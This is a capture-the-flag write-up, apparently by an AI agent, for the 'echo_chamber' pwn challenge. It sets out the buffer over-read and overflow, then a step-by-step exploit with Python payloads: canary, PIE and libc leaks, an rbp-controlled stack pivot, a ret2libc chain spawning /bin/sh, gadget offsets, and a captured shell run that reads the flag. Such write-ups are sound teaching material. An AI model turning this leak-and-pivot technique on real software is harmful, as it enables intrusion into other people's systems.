# echo_chamber

> Pwn · Hard · Iulian Schifirnet  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{h3z9Vtl0a3dNPYWqZPsWwtXE}
```

**Challenge**

> An echo node that repeats every transmission back to you, word for word. Recon says the operators
> were careless about how much they copy before they speak. Reach the node, make it repeat something
> it was never meant to be holding, and take the process for yourself.

`echo_chamber.tar.gz` ships the ELF plus the matching loader/libc and the source `echo_chamber.c`.
The binary is PIE with full RELRO, a stack canary and NX, on **GNU libc 2.35-0ubuntu3.15** (string
confirmed in the shipped `libc.so.6`). The whole program is one loop:

```c
static void chamber(void) {
    char buf[0x50];
    puts("The chamber listens. Say 'bye' to leave.");
    for (;;) {
        printf("> ");
        read(0, buf, 0x70);                 // reads 0x70 into a 0x50 buffer
        if (strncmp(buf, "bye", 3) == 0)
            break;
        printf("echo: %s\n", buf);          // prints until a NUL, not until read length
    }
}
```

`buf` is `char[0x50]` at `rbp-0x60`, so the frame is: `buf` at `0x00`–`0x4f`, canary at `0x58`
(`rbp-0x8`), saved `rbp` at `0x60`, saved return address at `0x68`.

**Approach / walkthrough**

The read of `0x70` (112) bytes into a `0x50` buffer reaches offsets `0..0x6f` — exactly covering the
canary, saved `rbp`, and the return slot, and no further. A normal ROP chain does not fit in that one
frame. But the loop reruns `read` **in place** over the same frame and only `bye` breaks out, with
the canary checked only on `leave`/return. That gives two primitives in a single connection:

- **Leak:** `printf("echo: %s\n", buf)` prints from `buf` up to the first NUL. Partially overwriting
  a field's low byte(s) with non-NUL data makes `%s` run past it and echo the adjacent secret bytes.
- **Overwrite:** the same `read` restores the canary and rewrites saved `rbp` and the return address
  before leaving with `bye`.

The key constraint: **the binary has no `pop rdi; ret`** (no `5f c3` anywhere in the file), so a
classic `puts(GOT)` libc leak is unavailable. The usable gadgets are only `leave; ret` (at
`pie+0x1365`, the sole `c9 c3` in the file), `pop rbp; ret`, and `ret`. The trick is to reuse the
program's *own* echo as an arbitrary-read gadget by controlling `rbp`: the echo computes its argument
as `lea rax,[rbp-0x60]; mov rsi,rax` before `printf("echo: %s")`, so pointing `rbp` at a chosen
location makes the chamber leak the qword living there.

All steps happen over one connection (`claude/x/final.py`, run as `python3 final.py remote`). The
script keys off the service's `> ` prompt and the `echo: ` prefix to slice each leak out of the
reply:

1. **Leak canary.** Send `0x59` bytes (`p.send(b"A"*0x59)`) — one byte past `buf+0x58` overwrites the
   canary's NUL LSB, so the echo prints `canary[1..7]`; prepend `\x00`
   (`u64((b"\x00"+d[0x59:0x60]).ljust(8,b"\x00"))`) to recover the full value.
2. **Leak stack.** Send `0x60` bytes → echo returns saved `rbp` (a stack address), sliced as
   `d[0x60:]`.
3. **Leak PIE.** Send `0x68` bytes → echo returns the saved return address; `pie_base = leaked -
   0x137e`.
4. **Leak libc via a controlled-`rbp` echo.** Break the loop with a payload that keeps the real
   canary and redirects `rbp` and the return into the echo block:

   ```python
   R  = savedrbp + 8 + 0x60
   pl = b"bye\x00" + b"P"*(0x58-4) + p64(canary) + p64(R) + p64(pie+0x1332)
   ```

   With `rbp := savedrbp + 8 + 0x60` and the return `:= pie + 0x1332` (the
   `lea rax,[rbp-0x60]; mov rsi,rax; printf("echo: %s")` block inside `chamber`), the echo now prints
   the qword at `savedrbp+8` = `main`'s return address = `__libc_start_call_main+0x80`, giving
   `libc_base = leaked - 0x29d90`. The code then re-enters the read loop with `rbp` preserved at `R`.
5. **Pivot + ret2libc.** In the second stage (`rbp = R`), stage the chain at `buf2 = R-0x60`. Build
   the ret2libc chain and the pivot payload:

   ```python
   buf2  = R - 0x60
   a     = 1 if (buf2 % 16) == 0 else 0
   chain = p64(libc+0x2a3e5) + p64(libc+0x1d8678) + p64(libc+0x29cd6)*a + p64(libc+0x50d70)
   pl2   = (b"bye\x00" + b"Q"*4 + chain).ljust(0x58, b"R") + p64(canary) + p64(buf2) + p64(pie+0x1365)
   assert len(pl2) == 0x70
   ```

   The double `leave; ret` pivot (saved `rbp := buf2`, return `:= pie + 0x1365`) lands `rsp` in `buf2`
   and executes the chain at `buf2+8`: `pop rdi (libc+0x2a3e5)` → `"/bin/sh" (libc+0x1d8678)` →
   optional `ret (libc+0x29cd6)` → `system (libc+0x50d70)`.
6. The shell runs as `uid=10001(ctf)`, and the follow-up command prints the flag.

**The alignment subtlety (local vs remote).** glibc 2.35 `system` hits a `movaps` that faults unless
`rsp % 16 == 8` at the `system` entry, which here depends on `buf2 % 16`. The correct rule is
`a = 1 if buf2%16==0 else 0` — insert one extra `ret` only when `buf2` is 16-aligned. **qemu-user (the
amd64 `csctf-pwn:1` image on the Apple-silicon host) ignores `movaps` alignment**, so a wrong `a`
still "worked" locally and masked the bug, while the real x86-64 remote segfaults on the wrong parity.
An early inverted formula (`a = 0 if buf2%16==0 else 1`) made all three initial remote runs
(`rem1.txt`–`rem3.txt`, all `buf2%16==8`, `a=1`) return no shell. With the corrected formula, the
run in `remfix.txt` (`buf2%16==8`, now `a=0`) dropped a shell, and the follow-up
`echo ===S===; cat flag.txt flag /flag.txt /flag ./flag* 2>/dev/null; id` printed the flag. It
appears three times because several of those paths/globs resolve to the same file.

The captured live run:

```
[*] canary=0x28085dc11de56c00 pie=0x5b78c1532000 libc=0x76994a930000 buf2=0x7fff833c3a88 align_rets=0
===S===
CSCTF{h3z9Vtl0a3dNPYWqZPsWwtXE}
uid=10001(ctf) gid=10001 groups=10001
```

Offsets reference (PIE + libc 2.35-0ubuntu3.15):

| symbol / gadget | offset |
| --- | --- |
| `chamber` echo `lea rax,[rbp-0x60]; …; printf` | `pie + 0x1332` |
| `main` saved-RIP delta (`pie_base = leaked - 0x137e`) | `- 0x137e` |
| `leave; ret` | `pie + 0x1365` |
| `__libc_start_call_main+0x80` stack-leak delta | `- 0x29d90` |
| `pop rdi; ret` (libc) | `libc + 0x2a3e5` |
| bare `ret` (libc) | `libc + 0x29cd6` |
| `"/bin/sh"` (libc) | `libc + 0x1d8678` |
| `system` (libc) | `libc + 0x50d70` |

**Why it works**

An off-by-design copy length paired with `%s` on an unterminated buffer leaks every secret on the
stack, so the canary and ASLR stop mattering. The overflow is too short for a real ROP chain, but
controlling saved `rbp` is enough: re-entering the function's own code with a chosen frame pointer
turns its echo into an arbitrary stack read (defeating the missing `pop rdi`), and turns its `leave`
into a stack pivot onto a larger buffer we fully control for the final ret2libc.

**Validation / reproduction**

The chain was built and run in the amd64 `csctf-pwn` Docker image against the shipped libc; the logs
show the `linux/amd64` platform warning on the arm64 host. PIE offsets (`0x1332`, `0x1365`, `0x137e`)
were re-checked against `objdump` of the shipped `echo_chamber` (no `5f c3`; `c9 c3` only at
`0x1365`), and the libc offsets against the shipped `libc.so.6`
(`system=0x50d70`, `"/bin/sh"=0x1d8678`, `5f c3` at `0x2a3e5`, `c3` at `0x29cd6`; `0x29d90` is the
instruction after the `call rax` into `main` in `__libc_start_call_main`). The flag is a per-instance
random value (`flag_mode: random`, `CSCTF{` + 24 chars + `}`); the value above is the one captured
from our assigned instance and accepted by CTFd.

Reproduce: in `workspace/9136-echo-chamber/claude/x` (has `echo_chamber`, `echo_patched`, `libc.so.6`,
`ld`, `final.py`), run `python3 final.py` for the local path (uses `echo_patched`, re-linked to the
shipped ld/libc) or `python3 final.py remote` against a fresh instance after editing `HOST,PORT` to
its connection info. Gotcha: the alignment parity must match the *real* x86-64 target, not the
emulator — qemu-user hides the `movaps` fault, so validate the parity rule rather than trusting a
local shell.
